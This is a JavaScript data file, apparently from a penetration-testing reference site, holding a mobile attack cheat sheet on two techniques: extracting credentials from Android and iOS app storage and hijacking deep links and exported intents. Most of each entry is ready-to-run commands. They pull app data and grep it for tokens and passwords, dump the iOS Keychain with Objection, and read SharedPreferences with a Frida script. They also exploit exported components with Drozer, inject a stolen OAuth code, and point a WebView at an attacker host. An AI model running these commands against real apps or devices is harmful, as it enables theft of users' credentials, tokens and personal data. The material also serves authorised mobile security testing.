export const mobileStorageTechniques = [
  {
    id: 'mob-insecure-storage',
    title: 'Insecure Data Storage',
    subtitle: 'Extract credentials, tokens, and PII from local storage, databases, and logs',
    tags: ['SharedPreferences', 'SQLite', 'logcat', 'external storage', 'NSUserDefaults', 'plist', 'Keychain'],
    accentColor: 'purple',
    overview: 'Mobile apps frequently store sensitive data in insecure locations accessible to other apps or attackers with physical device access. OWASP MSTG M2 covers all common insecure storage patterns.',
    steps: [
      'SharedPreferences (Android): plain XML files in /data/data/<package>/shared_prefs/ — world-readable if MODE_WORLD_READABLE',
      'NSUserDefaults (iOS): plist at Library/Preferences/<bundle-id>.plist — not encrypted by default',
      'SQLite databases: /data/data/<package>/databases/ — often contain full user records unencrypted',
      'External storage: /sdcard/Android/data/<package>/ — readable by all apps with READ_EXTERNAL_STORAGE',
      'Logcat: apps frequently log sensitive data during development — check logcat for tokens, PII',
      'Keychain (iOS): check accessibility attributes — kSecAttrAccessibleAlways bypasses device lock',
      'Clipboard: some apps write passwords or tokens to clipboard — accessible cross-app',
    ],
    commands: [
      {
        title: 'Insecure storage enumeration',
        code: `# Android — dump all app data directories
adb shell run-as com.target.app ls -la /data/data/com.target.app/
adb pull /data/data/com.target.app/ ./app_data/

# SharedPreferences — read all XML files
find app_data/shared_prefs/ -name "*.xml" -exec grep -l "token\|password\|secret\|key" {} \\;

# SQLite — enumerate and dump
sqlite3 app_data/databases/main.db ".tables"
sqlite3 app_data/databases/main.db ".dump"

# Logcat — capture sensitive logs
adb logcat -v brief | grep -iE "token|password|api_key|secret|user|session"

# External storage check
adb shell ls /sdcard/Android/data/com.target.app/

# iOS — dump Keychain (Objection)
objection -g com.target.app explore
ios keychain dump
ios plist cat Library/Preferences/com.target.app.plist

# iOS — filesystem traversal
ios file download /var/mobile/Containers/Data/Application/<UUID>/
ls Library/Preferences/
cat Library/Preferences/com.target.app.plist

# Grep for secrets in app bundle
find . -name "*.plist" -exec plutil -convert xml1 {} -o - \\; | grep -iE "key|token|secret|password"

# Frida — read SharedPreferences at runtime
Java.perform(function() {
  var Activity = Java.use("android.app.ActivityThread");
  var ctx = Activity.currentApplication().getApplicationContext();
  var prefs = ctx.getSharedPreferences("user_prefs", 0);
  var all = prefs.getAll();
  all.forEach(function(k,v) { console.log(k + " = " + v); });
});`
      }
    ]
  },
  {
    id: 'mob-deep-links',
    title: 'Deep Link & Intent Hijacking',
    subtitle: 'Intercept deep links and exported intents to steal data and trigger unauthorized actions',
    tags: ['deep link', 'intent hijacking', 'exported activity', 'URI scheme', 'Android intent', 'URL scheme iOS'],
    accentColor: 'purple',
    overview: 'Android exported activities and iOS URL schemes can be triggered by any app or browser link. Malicious apps can register competing URI schemes, intercept OAuth callbacks, or invoke exported activities directly to steal tokens or trigger privileged actions.',
    steps: [
      'List all exported activities, services, and broadcast receivers from AndroidManifest.xml',
      'Check for OAuth redirect URI schemes — any app can register the same custom scheme to intercept auth codes',
      'Test exported activities directly via ADB: am start -n com.target.app/.AdminActivity',
      'Check iOS custom URL schemes in Info.plist — register competing scheme in attacker app to intercept',
      'Send malformed intents with extra data to test for injection or path traversal in intent handlers',
      'Use Drozer (Android) to enumerate and exploit exported components systematically',
    ],
    commands: [
      {
        title: 'Deep link and intent enumeration',
        code: `# List exported components from manifest
apktool d app.apk -o decoded/
grep -A3 "exported=\"true\"" decoded/AndroidManifest.xml

# ADB — trigger exported activity directly
adb shell am start -n com.target.app/.activities.AdminActivity
adb shell am start -n com.target.app/.activities.WebViewActivity \\
  --es url "http://attacker.com"

# Deep link trigger (custom URI scheme)
adb shell am start -a android.intent.action.VIEW \\
  -d "target://auth/callback?code=stolen_code" com.target.app

# Drozer — comprehensive component enumeration
adb forward tcp:31415 tcp:31415
drozer console connect

# Enumerate attack surface
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app
run app.broadcast.info -a com.target.app

# Invoke exported activity via Drozer
run app.activity.start --component com.target.app com.target.app.LoginActivity

# iOS — URL scheme enumeration
grep -A5 "CFBundleURLTypes" Info.plist
# Trigger iOS URL scheme
xcrun simctl openurl booted "targetapp://auth/callback?token=test"

# Task hijacking (Android — StrandHogg)
# Set taskAffinity to victim app package + allowTaskReparenting=true
# Malicious app appears to be victim app in recents`
      }
    ]
  },
];